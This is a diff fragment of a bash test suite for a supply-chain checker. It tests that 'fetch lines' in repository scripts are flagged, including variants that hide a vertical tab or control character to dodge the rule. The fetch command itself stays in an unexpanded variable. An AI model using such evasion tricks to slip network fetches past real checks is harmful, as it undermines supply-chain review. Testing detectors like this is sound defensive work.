+mkdir -p "$work/pcr-ok/bin"; printf '%s\n' '#!/bin/bash' "$P5L" >"$work/pcr-ok/bin/x.sh"
+CASE="AC19'' --print-context control: the same plain line alone prints the whole file's hash"
+check test "$(cd "$work/pcr-ok" && python3 "$chk" --print-context bin/x.sh "$P5L")" = "$(shasum -a 256 "$work/pcr-ok/bin/x.sh" | cut -d' ' -f1)"
+one ifvt "$FETCH$LIT"$'\v\n' "$LIT"
+CASE="AC19'' (5) checker: a fetch line ending in a vertical tab is never ruled: exit 1"
+refused 0
+one ifc1 "$FETCH$LIT"$'\x01\n' "$LIT"$'\x01'
+CASE="AC19'' (5) checker: a fetch line holding a control character is never ruled: exit 1"
+refused 0
 # rows from the pull request itself, the trusted copy, malformed lists, both lists
 ifrepo ifhead "${SUPPORT[@]}" head bin/fetch.sh "$FETCH$LIT"$'\n'"$KEY"$'\n' head .github/supply-chain-exceptions.json "$(cat "$work/if-ok.json")"
 rc=0; python3 "$chk" --root "$work/ifhead" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/if.out" 2>&1 || rc=$?
